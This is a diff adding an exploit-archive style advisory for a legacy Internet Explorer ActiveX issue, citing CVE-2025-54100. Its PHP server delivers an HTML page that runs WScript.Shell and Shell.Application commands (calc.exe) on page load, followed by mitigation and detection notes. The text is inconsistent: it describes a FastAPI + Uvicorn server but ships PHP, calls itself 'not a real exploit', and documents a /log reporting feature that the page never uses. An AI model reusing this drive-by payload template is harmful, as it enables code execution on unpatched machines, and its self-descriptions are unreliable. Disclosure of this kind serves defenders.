@@ -1,0 +1,271 @@
+=============================================================================================================================================
+| # Title     : Analyzing Legacy ActiveX Execution Behavior via a FastAPI‑Based Delivery Server                                             |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : System built‑in component. No standalone download available.                                                                |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212823/ & CVE-2025-54100
+
+[+] Summary    : This script is a FastAPI + Uvicorn Proof‑of‑Concept server created for educational and historical analysis related to CVE‑2025‑54100.
+
+Important limitations:
+
+[!] Does NOT work on modern browsers
+
+[!] Does NOT execute real commands today
+
+[!] Not a real exploit
+
+[!] Safe for educational demonstration only
+
+[+] Technical context:
+
+The JavaScript payload uses legacy ActiveX calls such as:
+
+new ActiveXObject("WScript.Shell").Run("calc.exe");
+
+These techniques only worked in the past under very specific conditions:
+
+Internet Explorer
+
+ActiveX explicitly enabled
+
+Extremely low security settings
+
+All modern browsers and operating systems fully block this behavior.
+
+[+] What the PoC demonstrates:
+
+How ActiveX-based execution was historically dangerous
+
+Why Microsoft and browser vendors permanently disabled ActiveX
+
+How browser security policies evolved over time
+
+Why legacy exploit techniques are no longer viable
+
+Why it may appear dangerous to some:
+
+The code looks “powerful”
+
+The presence of a CVE identifier suggests severity
+
+In reality, it relies entirely on deprecated and extinct technologies
+
+[+] Purpose:
+
+Academic reference
+
+Security history education
+
+Legacy vulnerability analysis
+
+Not intended for exploitation or real‑world attacks
+
+[+] Vendor :
+
+Microsoft (Internet Explorer – Legacy Components)
+
+[+] Affected Products :
+
+Internet Explorer (legacy versions with ActiveX enabled)
+
+Windows systems where ActiveX and scripting are explicitly allowed
+
+[+] Affected Components :
+
+WScript.Shell
+
+Shell.Application
+
+ActiveX scripting interfaces exposed to the browser context
+
+[+] Severity :
+
+Medium (Historical / Legacy Risk)
+
+This issue is considered historical and non‑exploitable on modern browsers. It is relevant for research environments, legacy systems, and defensive analysis only.
+
+[+]  POC
+
+This Proof of Concept (PoC) demonstrates how legacy ActiveX objects in Internet Explorer can be invoked automatically when a crafted HTML payload is delivered by a minimal HTTP server. 
+The PoC shows automatic execution attempts using WScript.Shell and Shell.Application without additional user interaction beyond page rendering.
+
+Modern browsers have fully mitigated this behavior by disabling ActiveX. The PoC is intended strictly for educational, defensive, and historical security research.
+
+[+] Technical Details :
+
+When Internet Explorer is configured to:
+
+Allow ActiveX execution
+
+Trust the hosting zone
+
+Permit scripting of unsafe controls
+
+a web page can attempt to instantiate legacy COM objects such as:
+
+new ActiveXObject("WScript.Shell")
+new ActiveXObject("Shell.Application")
+
+The PoC delivers an HTML payload that attempts command execution (e.g., launching calc.exe) immediately upon page load.
+
+The server also exposes a /log endpoint to demonstrate client‑side execution reporting.
+
+[+] PoC Behavior
+
+Lightweight HTTP server
+
+Serves crafted HTML payload
+
+Attempts ActiveX execution on page load
+
+Logs client activity to console
+
+Supported Environment (PoC)
+
+[+] Windows
+
+Internet Explorer (legacy)
+
+ActiveX enabled
+
+Trusted security zone
+
+[+] PHP PoC Code : php poc.php
+
+<?php
+/**
+ * ActiveX Legacy Auto-Execution PoC
+ * by indoushka
+ * PHP 5.6+
+ */
+
+set_time_limit(0);
+error_reporting(E_ALL);
+
+$HOST = "0.0.0.0";
+$PORT = 8888;
+$BUF  = 4096;
+
+function payload_html() {
+return <<<HTML
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ActiveX Legacy PoC</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=10">
+</head>
+<body>
+<h2>PoC Ready</h2>
+<script>
+try {
+    new ActiveXObject("WScript.Shell").Run("calc.exe");
+} catch(e) {}
+
+try {
+    new ActiveXObject("Shell.Application")
+        .ShellExecute("calc.exe","","","open",1);
+} catch(e) {}
+</script>
+</body>
+</html>
+HTML;
+}
+
+$server = stream_socket_server("tcp://$HOST:$PORT", $e, $s);
+echo "[+] Listening on $HOST:$PORT\n";
+
+while ($c = stream_socket_accept($server)) {
+    $req = fread($c, $BUF);
+
+    if (preg_match('#GET /log\?msg=([^ ]+)#', $req, $m)) {
+        echo "[CLIENT_LOG] ".urldecode($m[1])."\n";
+        fwrite($c,"HTTP/1.1 200 OK\r\n\r\nOK");
+        fclose($c);
+        continue;
+    }
+
+    if (strpos($req,"GET / ") === 0) {
+        $html = payload_html();
+        fwrite($c,
+            "HTTP/1.1 200 OK\r\n".
+            "Content-Type: text/html\r\n".
+            "Content-Length: ".strlen($html)."\r\n\r\n".
+            $html
+        );
+    } else {
+        fwrite($c,"HTTP/1.1 404 Not Found\r\n\r\n");
+    }
+    fclose($c);
+}
+
+
+Expected output:
+
+[+] Listening on 0.0.0.0:8888
+
+3. Access the PoC
+
+Open Internet Explorer (legacy) and navigate to:
+
+http://SERVER_IP:8888/
+
+
+⚠️ ActiveX must be enabled
+⚠️ Page must be in a trusted zone
+
+[+] Impact :
+
+Demonstrates automatic invocation of legacy COM objects
+
+Highlights historical browser trust‑boundary issues
+
+No impact on modern browsers
+
+[+] Useful for:
+
+Security training
+
+Blue‑team detection logic
+
+Legacy system audits
+
+[+] Mitigation :
+
+Disable Internet Explorer
+
+Disable ActiveX entirely
+
+Use modern browsers (Edge, Chrome, Firefox)
+
+Enforce Group Policy restrictions on scripting and COM access
+
+[+] Detection :
+
+Defensive teams can monitor for:
+
+Instantiation of WScript.Shell from browser contexts
+
+Legacy IE process spawning child processes
+
+Unexpected COM object usage from iexplore.exe
+
+[+] Disclaimer :
+
+This Proof of Concept is provided for educational and research purposes only.
+The author does not encourage misuse.
+All testing should be conducted in isolated laboratory environments.
+
+[+] References :
+
+Microsoft ActiveX Security Documentation
+
+Legacy Internet Explorer Security Model
+
+COM Object Abuse Research
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
